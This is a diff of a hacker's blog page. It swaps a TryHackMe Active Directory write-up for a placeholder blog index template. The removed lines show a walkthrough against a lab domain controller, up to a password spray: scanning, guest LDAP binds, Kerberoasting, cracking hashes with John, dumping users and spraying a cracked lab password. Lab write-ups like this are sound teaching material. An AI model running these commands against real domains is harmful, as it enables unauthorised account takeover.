@@ -3,10 +3,12 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Operation EndGames — Breach Reconstruction Log</title>
+<title>YOUR_HANDLE — writeups</title>
+<meta name="description" content="EDIT ME: one-line description of your site for search engines / link previews.">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=VT323&family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;0,700;1,400&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
 <style>
   :root{
     --bg:            #03100a;
@@ -15,38 +17,30 @@
     --bg-inset-2:    #0a1f14;
     --border:        #134a2c;
     --border-dim:    #0c2a1a;
-    --green:         #46ffa0;     /* bright phosphor — headers, prompts */
-    --green-soft:    #9fe8bd;     /* body text */
-    --green-dim:     #3f7a5c;     /* muted / comments / timestamps */
-    --amber:         #ffb454;     /* warnings, flag, emphasis */
-    --red:           #ff6b6b;     /* failures */
+    --green:         #46ffa0;
+    --green-soft:    #9fe8bd;
+    --green-dim:     #3f7a5c;
+    --amber:         #ffb454;
+    --red:           #ff6b6b;
     --white-ish:     #d9fbe8;
     --glow: 0 0 6px rgba(70,255,160,.45);
     --font-display: 'VT323', monospace;
     --font-mono: 'JetBrains Mono', ui-monospace, 'SFMono-Regular', Menlo, Consolas, monospace;
   }
-
   *{box-sizing:border-box;}
   html{scroll-behavior:smooth;}
   @media (prefers-reduced-motion: reduce){ html{scroll-behavior:auto;} *{animation:none !important; transition:none !important;} }
 
   body{
-    margin:0;
-    background:var(--bg);
-    color:var(--green-soft);
-    font-family:var(--font-mono);
-    font-size:15.5px;
-    line-height:1.65;
+    margin:0; background:var(--bg); color:var(--green-soft);
+    font-family:var(--font-mono); font-size:15.5px; line-height:1.65;
     -webkit-font-smoothing:antialiased;
   }
-
   ::selection{ background:var(--green); color:#03100a; }
+  a{ color:var(--green); text-decoration:none; }
+  a:hover{ color:var(--white-ish); text-shadow:var(--glow); }
+  a:focus-visible{ outline:2px solid var(--green); outline-offset:3px; }
 
-  a{ color:var(--green); text-decoration:none; border-bottom:1px solid var(--border); }
-  a:hover{ color:var(--white-ish); border-color:var(--green); text-shadow:var(--glow); }
-  a:focus-visible, button:focus-visible{ outline:2px solid var(--green); outline-offset:3px; }
-
-  /* ambient CRT texture */
   .crt-overlay{
     position:fixed; inset:0; pointer-events:none; z-index:80;
     background:
@@ -54,574 +48,229 @@
       radial-gradient(ellipse at 50% 0%, rgba(70,255,160,.05), transparent 60%);
     mix-blend-mode:overlay;
   }
-  .flicker{ animation:flicker 9s infinite; }
-  @keyframes flicker{
-    0%,93%,100%{ filter:brightness(1); }
-    94%{ filter:brightness(1.03); }
-    95%{ filter:brightness(.985); }
-    96%{ filter:brightness(1.015); }
-  }
-
-  .visually-hidden{ position:absolute; width:1px; height:1px; overflow:hidden; clip:rect(0 0 0 0); }
-
-  /* ---------- shell / titlebar ---------- */
-  .terminal-shell{ max-width:1180px; margin:0 auto; padding:0 0 6rem; }
 
   .term-titlebar{
-    position:sticky; top:0; z-index:60;
-    display:flex; align-items:center; gap:.9rem;
-    padding:.65rem 1.25rem;
-    background:rgba(6,27,17,.92);
-    border-bottom:1px solid var(--border);
-    backdrop-filter:blur(6px);
-    font-size:13px;
+    position:sticky; top:0; z-index:60; display:flex; align-items:center; gap:.9rem;
+    padding:.65rem 1.25rem; background:rgba(6,27,17,.92); border-bottom:1px solid var(--border);
+    backdrop-filter:blur(6px); font-size:13px;
   }
   .term-titlebar .dots{ display:flex; gap:6px; flex-shrink:0;}
   .term-titlebar .dots span{ width:11px; height:11px; border-radius:50%; display:block; background:var(--border-dim); border:1px solid var(--border);}
-  .term-path{ color:var(--green-dim); flex:1; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
-  .term-status{ display:flex; align-items:center; gap:.45rem; color:var(--green-dim); flex-shrink:0; }
-  .dot-live{ width:7px; height:7px; border-radius:50%; background:var(--green); box-shadow:var(--glow); animation:pulse 1.6s ease-in-out infinite; }
+  .term-path{ color:var(--green-dim); flex:1; }
+  .dot-live{ width:7px; height:7px; border-radius:50%; background:var(--green); box-shadow:var(--glow); animation:pulse 1.6s ease-in-out infinite; display:inline-block; margin-right:.4rem;}
   @keyframes pulse{ 0%,100%{opacity:1;} 50%{opacity:.35;} }
 
-  /* ---------- hero ---------- */
-  .hero{
-    padding:5.5rem 1.5rem 4rem;
+  .shell{
+    max-width:1280px; margin:0 auto;
+    display:grid; grid-template-columns:270px minmax(0,1fr) 240px; gap:0;
+    align-items:start;
+  }
+
+  /* ---------- profile sidebar ---------- */
+  .profile{
+    position:sticky; top:53px; height:calc(100vh - 53px); overflow-y:auto;
+    padding:3rem 1.6rem 2rem; border-right:1px solid var(--border-dim);
     text-align:center;
-    border-bottom:1px solid var(--border-dim);
+  }
+  .avatar{
+    width:104px; height:104px; margin:0 auto 1.1rem; border-radius:50%;
+    border:2px solid var(--green); display:flex; align-items:center; justify-content:center;
+    font-family:var(--font-display); font-size:2.6rem; color:var(--green);
+    text-shadow:0 0 14px rgba(70,255,160,.6); background:var(--bg-inset-2);
+    box-shadow:0 0 24px rgba(70,255,160,.12);
+  }
+  .site-title{
+    font-family:var(--font-display); font-size:2.2rem; letter-spacing:.03em; margin:0 0 .3rem;
+    color:var(--white-ish);
+  }
+  .site-tagline{ font-size:13px; color:var(--green-dim); margin:0 0 1.8rem; line-height:1.5; }
+
+  .profile-nav{ list-style:none; margin:0 0 1.8rem; padding:0; text-align:left; }
+  .profile-nav li{ border-bottom:1px dashed var(--border-dim); }
+  .profile-nav a{
+    display:flex; align-items:center; gap:.55rem; padding:.6rem .3rem; font-size:13.5px;
+    color:var(--green-soft);
+  }
+  .profile-nav a:hover{ color:var(--green); padding-left:.55rem; }
+  .profile-nav a i{ width:1.1em; color:var(--green-dim); }
+  .profile-nav a:hover i{ color:var(--green); }
+
+  .social-row{ display:flex; justify-content:center; gap:.9rem; margin-bottom:1.8rem; }
+  .social-row a{
+    width:34px; height:34px; border:1px solid var(--border); border-radius:50%;
+    display:flex; align-items:center; justify-content:center; color:var(--green-dim); font-size:14px;
+  }
+  .social-row a:hover{ color:var(--green); border-color:var(--green); box-shadow:var(--glow); }
+
+  .profile-foot{ font-size:11px; color:var(--green-dim); line-height:1.6; }
+
+  /* ---------- main: posts list ---------- */
+  .posts{ padding:3rem clamp(1.25rem,3vw,3rem); min-width:0; }
+  .posts > h1{
+    font-family:var(--font-display); font-size:2.4rem; font-weight:400; color:var(--white-ish);
+    margin:0 0 .3rem;
+  }
+  .posts > .sub{ font-size:13px; color:var(--green-dim); margin:0 0 2.2rem; }
+
+  .post-card{
+    display:grid; grid-template-columns:124px 1fr; gap:1.3rem;
+    padding:1.3rem; margin-bottom:1.2rem; border:1px solid var(--border-dim); border-radius:6px;
+    background:var(--bg-inset); transition:border-color .15s ease, transform .15s ease;
+  }
+  .post-card:hover{ border-color:var(--green); transform:translateY(-2px); }
+  .post-thumb{
+    width:124px; height:124px; border-radius:4px; border:1px solid var(--border);
     background:
-      radial-gradient(ellipse 60% 50% at 50% 0%, rgba(70,255,160,.08), transparent 70%);
+      repeating-linear-gradient(45deg, var(--bg-inset-2) 0 6px, var(--bg-inset) 6px 12px);
+    display:flex; align-items:center; justify-content:center;
+    font-family:var(--font-display); font-size:1rem; color:var(--green-dim); text-align:center; padding:.4rem;
   }
-  .hero-eyebrow{
-    font-size:12.5px; letter-spacing:.35em; text-transform:uppercase;
-    color:var(--green-dim); margin:0 0 1.6rem;
+  .post-body h2{ margin:0 0 .5rem; font-size:1.25rem; font-weight:600; }
+  .post-body h2 a{ color:var(--white-ish); }
+  .post-card:hover .post-body h2 a{ color:var(--green); text-shadow:var(--glow); }
+  .post-excerpt{ color:var(--green-soft); font-size:13.5px; margin:0 0 .8rem; line-height:1.55; }
+  .post-meta{ font-size:12px; color:var(--green-dim); display:flex; gap:1rem; flex-wrap:wrap; }
+  .post-meta span i{ margin-right:.35em; }
+  .post-tags{ margin-top:.6rem; display:flex; gap:.4rem; flex-wrap:wrap; }
+  .post-tags a{
+    font-size:11px; color:var(--green-dim); border:1px solid var(--border-dim); border-radius:3px;
+    padding:.15rem .5rem;
   }
-  .hero-eyebrow::before{ content:"[ "; } .hero-eyebrow::after{ content:" ]"; }
+  .post-tags a:hover{ color:var(--green); border-color:var(--green); }
 
-  .hero-frame{
-    display:inline-block; position:relative; padding:1.6rem 2.4rem;
+  .post-card.placeholder{ border-style:dashed; opacity:.55; }
+  .post-card.placeholder:hover{ transform:none; border-color:var(--border-dim); }
+  .post-card.placeholder .post-thumb{ color:var(--green-dim); }
+
+  /* ---------- right widgets ---------- */
+  .widgets{ padding:3rem 1.4rem 2rem 0; }
+  .widget{ margin-bottom:2rem; }
+  .widget h3{
+    font-family:var(--font-display); font-size:1.15rem; letter-spacing:.08em; text-transform:uppercase;
+    color:var(--green-dim); margin:0 0 .8rem; border-bottom:1px solid var(--border-dim); padding-bottom:.4rem;
   }
-  .hero-frame::before, .hero-frame::after{
-    content:""; position:absolute; width:22px; height:22px; border:2px solid var(--green); opacity:.6;
+  .widget ul{ list-style:none; margin:0; padding:0; }
+  .widget li{ font-size:12.5px; margin-bottom:.55rem; }
+  .widget li a{ color:var(--green-soft); }
+  .widget li a:hover{ color:var(--green); }
+  .tag-cloud{ display:flex; flex-wrap:wrap; gap:.4rem; }
+  .tag-cloud a{
+    font-size:11.5px; color:var(--green-dim); border:1px solid var(--border-dim); border-radius:3px;
+    padding:.2rem .55rem;
   }
-  .hero-frame::before{ top:0; left:0; border-right:none; border-bottom:none; }
-  .hero-frame::after{ bottom:0; right:0; border-left:none; border-top:none; }
+  .tag-cloud a:hover{ color:var(--green); border-color:var(--green); }
 
-  .hero h1{
-    font-family:var(--font-display);
-    font-size:clamp(3rem, 9vw, 6.2rem);
-    line-height:.95;
-    letter-spacing:.04em;
-    margin:0;
-    color:var(--green);
-    text-shadow:0 0 18px rgba(70,255,160,.5), 0 0 2px rgba(70,255,160,.8);
-  }
-  .hero h1 small{ display:block; font-size:.32em; letter-spacing:.5em; color:var(--white-ish); text-shadow:none; margin-top:.3em; }
-
-  .hero-typed{
-    margin:1.9rem auto 0; max-width:46em;
-    color:var(--green-soft); font-size:1.02rem; min-height:1.6em;
-  }
-  .cursor{ display:inline-block; width:.55em; background:var(--green); margin-left:2px; box-shadow:var(--glow); animation:blink 1s steps(1) infinite; }
-  @keyframes blink{ 50%{ opacity:0; } }
-
-  .hero-meta{
-    display:flex; flex-wrap:wrap; justify-content:center; gap:.6rem 1rem;
-    margin-top:2.2rem; font-size:12.5px; color:var(--green-dim);
-  }
-  .hero-meta span{ border:1px solid var(--border); padding:.3rem .7rem; border-radius:2px; background:var(--bg-inset); }
-  .hero-meta span b{ color:var(--green-soft); font-weight:600; }
-
-  .scroll-cue{ display:inline-block; margin-top:2.6rem; font-size:12px; color:var(--green-dim); border:none; }
-  .scroll-cue:hover{ color:var(--green); border:none; }
-
-  /* ---------- layout ---------- */
-  .layout{ display:grid; grid-template-columns:230px 1fr; gap:0; align-items:start; }
-
-  .sidenav{
-    position:sticky; top:52px; align-self:start;
-    padding:2.4rem 1.2rem 2rem 1.5rem;
-    border-right:1px solid var(--border-dim);
-    height:calc(100vh - 52px); overflow-y:auto;
-  }
-  .nav-prompt{ color:var(--green-dim); font-size:12px; margin-bottom:1rem; white-space:pre-line; }
-  .sidenav ul{ list-style:none; margin:0; padding:0; }
-  .sidenav li{ margin:0; }
-  .sidenav a{
-    display:block; padding:.32rem 0; border:none; font-size:13px;
-    color:var(--green-dim); white-space:nowrap; overflow:hidden; text-overflow:ellipsis;
-    border-left:2px solid transparent; padding-left:.7rem; margin-left:-.7rem;
-  }
-  .sidenav a:before{ content:"· "; }
-  .sidenav a:hover{ color:var(--green); border-color:var(--border); }
-  .sidenav a.active{ color:var(--green); border-left-color:var(--green); text-shadow:var(--glow); }
-
-  .content{ padding:3rem clamp(1.25rem, 4vw, 3.5rem) 0; min-width:0; }
-
-  /* ---------- blocks / prompt headers ---------- */
-  .block{ margin-bottom:4rem; scroll-margin-top:70px; }
-  .prompt-header{
-    font-size:13px; color:var(--green-dim); margin-bottom:1.1rem; white-space:pre-line;
-  }
-  .prompt-header .path{ color:var(--green-dim); }
-  .prompt-header .cmd{ color:var(--white-ish); }
-  .prompt-header b{ color:var(--green); font-weight:600; }
-
-  .block h2{
-    font-family:var(--font-display); font-weight:400; letter-spacing:.02em;
-    font-size:2.1rem; margin:0 0 1.1rem; color:var(--white-ish);
-    display:flex; align-items:baseline; gap:.7rem;
-  }
-  .block h2 .act{ color:var(--green); font-size:.55em; letter-spacing:.18em; }
-
-  .block-body p{ margin:0 0 1.1rem; color:var(--green-soft); }
-  .block-body p:last-child{ margin-bottom:0; }
-  .block-body strong{ color:var(--white-ish); font-weight:600; }
-  .block-body code{ background:var(--bg-inset-2); color:var(--amber); padding:.1em .35em; border-radius:3px; font-size:.92em; }
-
-  pre{
-    margin:1rem 0 1.4rem; padding:1rem 1.15rem; overflow-x:auto;
-    background:var(--bg-inset); border:1px solid var(--border-dim); border-left:3px solid var(--border);
-    border-radius:4px; font-size:13px; line-height:1.55; color:var(--green-soft);
-  }
-  pre.cmd{ border-left-color:var(--green); }
-  pre code{ background:none; padding:0; color:inherit; }
-  .ok{ color:var(--green); text-shadow:var(--glow); }
-  .fail{ color:var(--red); }
-  .warn{ color:var(--amber); }
-  .dim{ color:var(--green-dim); }
-  .tag{ color:var(--white-ish); }
-
-  table{ width:100%; border-collapse:collapse; margin:1.2rem 0 1.6rem; font-size:13.5px; }
-  th,td{ text-align:left; padding:.5rem .8rem; border:1px solid var(--border-dim); }
-  th{ color:var(--green); font-weight:600; background:var(--bg-inset); }
-
-  .credential{
-    display:inline-block; margin:.3rem 0 .6rem; padding:.5rem .9rem;
-    border:1px dashed var(--green); border-radius:3px; background:var(--bg-inset-2);
-    color:var(--amber); font-weight:600; text-shadow:0 0 8px rgba(255,180,84,.35);
-  }
-
-  .callout{
-    border:1px solid var(--border); border-left:3px solid var(--amber);
-    background:var(--bg-inset); padding:.9rem 1.1rem; margin:1rem 0 1.6rem; border-radius:4px;
-  }
-  .callout p{ margin:0; }
-  .callout .label{ color:var(--amber); font-weight:600; }
-
-  /* flag */
-  .flag-block{
-    text-align:center; margin:2rem 0; padding:2rem 1.2rem;
-    border:1px solid var(--green); border-radius:6px; background:var(--bg-inset-2);
-    box-shadow:0 0 30px rgba(70,255,160,.08) inset;
-  }
-  .flag-block .label{ font-size:12px; letter-spacing:.3em; color:var(--green-dim); margin-bottom:.8rem; }
-  .flag-block code{
-    font-size:clamp(.95rem,2.4vw,1.3rem); color:var(--green); background:none; padding:0;
-    text-shadow:0 0 12px rgba(70,255,160,.6); word-break:break-all;
-  }
-
-  /* attack chain diagram */
-  .chain pre{ font-size:13px; color:var(--green-soft); }
-  .chain .node{ color:var(--white-ish); }
-
-  /* arsenal listing */
-  .arsenal pre{ font-size:13px; }
-  .arsenal .perm{ color:var(--green-dim); }
-  .arsenal .name{ color:var(--green); }
-  .arsenal .desc{ color:var(--green-soft); }
-
-  /* takeaways */
-  .takeaways ul{ list-style:none; margin:0; padding:0; }
-  .takeaways li{
-    padding:.9rem 1rem .9rem 2.3rem; margin-bottom:.8rem; position:relative;
-    border:1px solid var(--border-dim); border-left:3px solid var(--red); border-radius:4px;
-    background:var(--bg-inset);
-  }
-  .takeaways li::before{ content:"[!]"; position:absolute; left:.8rem; color:var(--red); font-weight:600; }
-  .takeaways strong{ color:var(--white-ish); }
-
-  /* footer */
-  .term-footer{
-    margin-top:1rem; padding:3rem clamp(1.25rem,4vw,3.5rem) 1rem; border-top:1px solid var(--border-dim);
-  }
-  .term-footer p{ color:var(--green-dim); font-size:13px; }
-  .term-footer .prompt-header{ margin-bottom:.6rem; }
-
-  /* responsive */
-  @media (max-width:900px){
-    .layout{ grid-template-columns:1fr; }
-    .sidenav{
-      position:static; height:auto; border-right:none; border-bottom:1px solid var(--border-dim);
-      padding:1rem 1.25rem;
-    }
-    .nav-prompt{ display:none; }
-    .sidenav ul{ display:flex; gap:1rem; overflow-x:auto; padding-bottom:.3rem; }
-    .sidenav a{ padding-left:0; margin-left:0; border-left:none; border-bottom:2px solid transparent; }
-    .sidenav a.active{ border-left:none; border-bottom-color:var(--green); }
-    .content{ padding-top:2rem; }
+  @media (max-width:1080px){ .shell{ grid-template-columns:240px 1fr; } .widgets{ display:none; } }
+  @media (max-width:760px){
+    .shell{ grid-template-columns:1fr; }
+    .profile{ position:static; height:auto; border-right:none; border-bottom:1px solid var(--border-dim); padding:2rem 1.25rem; }
+    .post-card{ grid-template-columns:1fr; }
+    .post-thumb{ width:100%; height:90px; }
   }
 </style>
 </head>
-<body class="flicker">
+<body>
 <div class="crt-overlay" aria-hidden="true"></div>
 
-<div class="terminal-shell">
+<header class="term-titlebar">
+  <div class="dots"><span></span><span></span><span></span></div>
+  <div class="term-path"><span class="dot-live" aria-hidden="true"></span>root@home:~#</div>
+</header>
 
-  <header class="term-titlebar">
-    <div class="dots"><span></span><span></span><span></span></div>
-    <div class="term-path">root@ad:~/operation_endgames#</div>
-    <div class="term-status"><span class="dot-live" aria-hidden="true"></span> SESSION ACTIVE</div>
-  </header>
+<div class="shell">
 
-  <section class="hero" id="top">
-    <p class="hero-eyebrow">breach reconstruction log</p>
-    <div class="hero-frame">
-      <h1>OPERATION<br>ENDGAMES<small>TryHackMe · Active Directory</small></h1>
+  <!-- ============ PROFILE SIDEBAR — edit everything below ============ -->
+  <aside class="profile">
+    <div class="avatar" aria-hidden="true">&gt;_</div>
+    <!-- EDIT: replace "&gt;_" above with <img src="assets/avatar.png" alt="..."> if you have a real avatar -->
+
+    <h1 class="site-title">YOUR_HANDLE</h1>
+    <!-- EDIT: your name / alias -->
+
+    <p class="site-tagline">EDIT ME: one-line tagline — e.g. "Notes from guest bind to Domain Admin."</p>
+
+    <ul class="profile-nav">
+      <li><a href="index.html"><i class="fa-solid fa-house"></i> ./home</a></li>
+      <li><a href="#writeups"><i class="fa-solid fa-folder-open"></i> ./writeups</a></li>
+      <li><a href="#tags"><i class="fa-solid fa-tags"></i> ./tags</a></li>
+      <li><a href="#about"><i class="fa-solid fa-terminal"></i> whoami</a></li>
+    </ul>
+
+    <div class="social-row">
+      <!-- EDIT: swap href="#" for your real profile URLs, delete any you don't want -->
+      <a href="#" aria-label="GitHub"><i class="fa-brands fa-github"></i></a>
+      <a href="#" aria-label="X / Twitter"><i class="fa-brands fa-x-twitter"></i></a>
+      <a href="#" aria-label="TryHackMe"><i class="fa-solid fa-flag"></i></a>
+      <a href="mailto:you@example.com" aria-label="Email"><i class="fa-solid fa-envelope"></i></a>
     </div>
-    <p class="hero-typed" id="heroTyped" aria-live="polite"></p>
-    <div class="hero-meta">
-      <span>TARGET <b>10.49.168.3</b></span>
-      <span>DOMAIN <b>thm.local</b></span>
-      <span>DC <b>ad.thm.local</b> (AD)</span>
-      <span>OS <b>Windows Server 2019</b></span>
-      <span>RESULT <b style="color:var(--amber)">DOMAIN COMPROMISED</b></span>
-    </div>
-    <a class="scroll-cue" href="#tldr">▼ scroll to begin</a>
-  </section>
 
-  <div class="layout">
-    <nav class="sidenav" aria-label="Section navigation">
-      <div class="nav-prompt">┌──(reader@you)-[~]
-└─$ ls -la sections/</div>
-      <ul id="navList">
-        <li><a href="#tldr">00_tldr.md</a></li>
-        <li><a href="#environment">00_env.cfg</a></li>
-        <li><a href="#recon">01_recon.sh</a></li>
-        <li><a href="#guest">02_guest_enum.sh</a></li>
-        <li><a href="#kerberoast">03_kerberoast.sh</a></li>
-        <li><a href="#enum">04_domain_enum.sh</a></li>
-        <li><a href="#spray">05_pw_spray.sh</a></li>
-        <li><a href="#bloodhound">06_bloodhound.sh</a></li>
-        <li><a href="#targeted">07_targeted_roast.sh</a></li>
-        <li><a href="#crack">08_crack.sh</a></li>
-        <li><a href="#rdp">09_rdp_access.sh</a></li>
-        <li><a href="#escalate">10_privesc.sh</a></li>
-        <li><a href="#chain">attack_chain.txt</a></li>
-        <li><a href="#arsenal">arsenal/</a></li>
-        <li><a href="#takeaways">takeaways.md</a></li>
+    <p id="about" class="profile-foot">
+      EDIT ME: 2–3 sentence bio. Who you are, what you focus on (AD, web, binary exploitation...), certs if any, and what this site is for.
+    </p>
+
+    <p class="profile-foot" style="margin-top:1.4rem;">© 2026 YOUR_HANDLE.<br>Built by hand, no framework.</p>
+  </aside>
+  <!-- ============ END PROFILE SIDEBAR ============ -->
+
+  <main class="posts" id="writeups">
+    <h1>writeups/</h1>
+    <p class="sub">$ ls -la --sort=time</p>
+
+    <article class="post-card">
+      <div class="post-thumb">AD</div>
+      <div class="post-body">
+        <h2><a href="writeups/operation-endgames.html">Operation EndGames — TryHackMe Writeup</a></h2>
+        <p class="post-excerpt">A full Active Directory box that falls in six acts: guest LDAP bind → Kerberoast → password reuse → BloodHound → targeted Kerberoast → a hardcoded credential that turns out to be Domain Admin.</p>
+        <div class="post-meta">
+          <span><i class="fa-regular fa-calendar"></i>Jun 20, 2026</span>
+          <span><i class="fa-regular fa-clock"></i>8 min read</span>
+        </div>
+        <div class="post-tags">
+          <a href="#tags">active-directory</a>
+          <a href="#tags">kerberoasting</a>
+          <a href="#tags">bloodhound</a>
+          <a href="#tags">thm</a>
+        </div>
+      </div>
+    </article>
+
+    <!-- ============ TEMPLATE: duplicate this block for each new writeup ============ -->
+    <article class="post-card placeholder">
+      <div class="post-thumb">?</div>
+      <div class="post-body">
+        <h2><a href="#">[ next writeup title ]</a></h2>
+        <p class="post-excerpt">[ one or two sentence summary of the box / challenge ]</p>
+        <div class="post-meta">
+          <span><i class="fa-regular fa-calendar"></i>[ date ]</span>
+          <span><i class="fa-regular fa-clock"></i>[ N min read ]</span>
+        </div>
+        <div class="post-tags"><a href="#tags">[tag]</a><a href="#tags">[tag]</a></div>
+      </div>
+    </article>
+    <!-- ============ delete the placeholder card above once you stop needing the example ============ -->
+
+  </main>
+
+  <aside class="widgets">
+    <div class="widget" id="tags">
+      <h3>tags</h3>
+      <div class="tag-cloud">
+        <a href="#">active-directory</a>
+        <a href="#">kerberoasting</a>
+        <a href="#">bloodhound</a>
+        <a href="#">thm</a>
+        <a href="#">privesc</a>
+        <a href="#">windows</a>
+      </div>
+    </div>
+    <div class="widget">
+      <h3>recent</h3>
+      <ul>
+        <li><a href="writeups/operation-endgames.html">Operation EndGames</a></li>
       </ul>
-    </nav>
-
-    <main class="content">
-
-      <section id="tldr" class="block">
-        <div class="prompt-header">┌──(operator@kali)-[~/writeup]
-└─$ <span class="cmd">cat 00_tldr.md</span></div>
-        <h2><span class="act">// 00</span>tl;dr</h2>
-        <div class="block-body">
-          <p>A full Active Directory environment that falls in six acts: an <strong>anonymous guest LDAP bind</strong> leaks a Kerberoastable account; the cracked password gets <strong>reused</strong> by a second user; <strong>BloodHound</strong> shows that user can write to a third user's SPN attribute; a <strong>targeted Kerberoast</strong> abuses that write privilege; the cracked hash buys RDP access; and a <strong>hardcoded credential</strong> in a sync script sitting on disk turns out to be local admin on the DC. Guest bind to Domain Admin, no exploit code required — just enumeration, reused secrets, and an ACL nobody was watching.</p>
-        </div>
-      </section>
-
-      <section id="environment" class="block">
-        <div class="prompt-header">┌──(operator@kali)-[~/writeup]
-└─$ <span class="cmd">cat 00_env.cfg</span></div>
-        <h2><span class="act">// 00</span>environment</h2>
-        <table>
-          <tr><th>target</th><td>10.49.168.3</td></tr>
-          <tr><th>domain</th><td>thm.local</td></tr>
-          <tr><th>domain controller</th><td>AD / ad.thm.local</td></tr>
-          <tr><th>os</th><td>Windows Server 2019 (Build 17763)</td></tr>
-          <tr><th>internal ca</th><td>thm-LABYRINTH-CA</td></tr>
-          <tr><th>attack box</th><td>Kali Linux</td></tr>
-        </table>
-      </section>
-
-      <section id="recon" class="block">
-        <div class="prompt-header">┌──(operator@kali)-[~/writeup]
-└─$ <span class="cmd">cat 01_recon.sh</span></div>
-        <h2><span class="act">// 01</span>reconnaissance</h2>
-        <div class="block-body">
-          <p>Full TCP service scan to start.</p>
-        </div>
-        <pre class="cmd"><code>$ sudo nmap -sV -sC 10.49.168.3 -vvv</code></pre>
-        <pre><code>PORT     STATE SERVICE           VERSION
-53/tcp   open  domain            Simple DNS Plus
-80/tcp   open  http              Microsoft IIS httpd 10.0
-88/tcp   open  kerberos-sec      Microsoft Windows Kerberos
-135/tcp  open  msrpc             Microsoft Windows RPC
-139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
-389/tcp  open  ldap              Active Directory LDAP (Domain: thm.local)
-443/tcp  open  ssl/https?
-445/tcp  open  microsoft-ds?
-464/tcp  open  kpasswd5?
-593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
-636/tcp  open  ldapssl?
-3268/tcp open  ldap              Global Catalog (Domain: thm.local)
-3269/tcp open  globalcatLDAPssl?
-3389/tcp open  ms-wbt-server     Microsoft Terminal Services</code></pre>
-        <div class="block-body">
-          <p>A textbook Domain Controller fingerprint — Kerberos, LDAP, Global Catalog ports, SMB, RDP, all lit up. The TLS cert on 443 leaks the internal CA name, <code>thm-LABYRINTH-CA</code>, and the RDP cert confirms the hostname: <code>ad.thm.local</code> / NetBIOS <code>AD</code>. Both got dropped into <code>/etc/hosts</code> before anything else.</p>
-        </div>
-      </section>
-
-      <section id="guest" class="block">
-        <div class="prompt-header">┌──(operator@kali)-[~/writeup]
-└─$ <span class="cmd">cat 02_guest_enum.sh</span></div>
-        <h2><span class="act">// 02</span>guest enumeration</h2>
-        <div class="block-body"><p>First check on any AD box: does the <strong>Guest</strong> account or a null session give anything up for free?</p></div>
-        <pre class="cmd"><code>$ netexec smb 10.49.168.3 -u "guest" -p "" --shares</code></pre>
-        <pre><code>SMB   10.49.168.3   445   AD   <span class="ok">[+]</span> thm.local\guest:
-SMB   10.49.168.3   445   AD   Share    Permissions   Remark
-SMB   10.49.168.3   445   AD   ADMIN$                 Remote Admin
-SMB   10.49.168.3   445   AD   C$                      Default share
-SMB   10.49.168.3   445   AD   IPC$     READ           Remote IPC
-SMB   10.49.168.3   445   AD   NETLOGON                Logon server share
-SMB   10.49.168.3   445   AD   SYSVOL                  Logon server share</code></pre>
-        <div class="block-body"><p>Guest authenticates, but the shares are unremarkable and <code>IPC$</code> came back empty over <code>smbclient</code>. The real win was a blank-password LDAP bind:</p></div>
-        <pre class="cmd"><code>$ nxc ldap ad.thm.local -u 'guest' -p ''</code></pre>
-        <pre><code>LDAP   10.49.168.3   389   AD   <span class="ok">[+]</span> thm.local\guest:</code></pre>
-      </section>
-
-      <section id="kerberoast" class="block">
-        <div class="prompt-header">┌──(operator@kali)-[~/writeup]
-└─$ <span class="cmd">cat 03_kerberoast.sh</span></div>
-        <h2><span class="act">// 03</span>kerberoasting, no creds needed</h2>
-        <div class="block-body"><p>An authenticated bind — even as Guest — is enough to query for accounts with a <code>servicePrincipalName</code> and request their TGS tickets in one shot.</p></div>
-        <pre class="cmd"><code>$ nxc ldap ad.thm.local -u 'guest' -p '' --kerberoasting kerberoastables.txt</code></pre>
-        <pre><code><span class="dim">[*]</span> sAMAccountName: <span class="tag">CODY_ROY</span>, memberOf: CN=Remote Desktop Users,..., pwdLastSet: 2024-05-10
-$krb5tgs$23$*CODY_ROY$THM.LOCAL$thm.local\CODY_ROY*$d7cf2be0...8a9da65c77e6 <span class="dim">[truncated]</span></code></pre>
-        <div class="block-body"><p>Straight into John against <code>rockyou.txt</code>:</p></div>
-        <pre class="cmd"><code>$ john kerberoastables.txt --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
-        <pre><code><span class="ok">MKO)mko0</span>         (?)
-1g 0:00:00:01 DONE</code></pre>
-        <div class="credential">cody_roy : MKO)mko0</div>
-        <div class="block-body"><p>Cracked in under two seconds. First real credential of the engagement.</p></div>
-      </section>
-
-      <section id="enum" class="block">
-        <div class="prompt-header">┌──(operator@kali)-[~/writeup]
-└─$ <span class="cmd">cat 04_domain_enum.sh</span></div>
-        <h2><span class="act">// 04</span>enumerating the domain</h2>
-        <div class="block-body"><p>With a valid, if low-privileged, account, LDAP opens right up.</p></div>
-        <pre class="cmd"><code>$ nxc ldap ad.thm.local -u 'cody_roy' -p 'MKO)mko0' --users</code></pre>
-        <div class="block-body"><p>Dumped <strong>489 domain users</strong>, mostly tagged <code>Tier 1 User</code>, plus the usual built-ins. Scraped the names into a list for the next step:</p></div>
-        <pre class="cmd"><code>$ nxc ldap ad.thm.local -u 'cody_roy' -p 'MKO)mko0' --users | grep "LDAP" | awk '{print $5}' > users.txt</code></pre>
-      </section>
-
-      <section id="spray" class="block">
-        <div class="prompt-header">┌──(operator@kali)-[~/writeup]
-└─$ <span class="cmd">cat 05_pw_spray.sh</span></div>
-        <h2><span class="act">// 05</span>password spraying — reuse pays off</h2>
-        <div class="block-body"><p>489 users and one known-good password is an obvious next move: spray it and see who reused it.</p></div>
-        <pre class="cmd"><code>$ sudo nxc smb ad.thm.local -u users.txt -p 'MKO)mko0' --continue-on-success</code></pre>
-        <pre><code><span class="dim">...mostly STATUS_LOGON_FAILURE...</span>
-SMB   10.49.168.3   445   AD   <span class="ok">[+]</span> thm.local\CODY_ROY:MKO)mko0
-SMB   10.49.168.3   445   AD   <span class="ok">[+]</span> thm.local\ZACHARY_HUNT:MKO)mko0</code></pre>
-        <div class="block-body"><p><strong>ZACHARY_HUNT</strong> was reusing CODY_ROY's exact password. Two accounts down, neither obviously privileged on its own — time to find out what they're actually worth.</p></div>
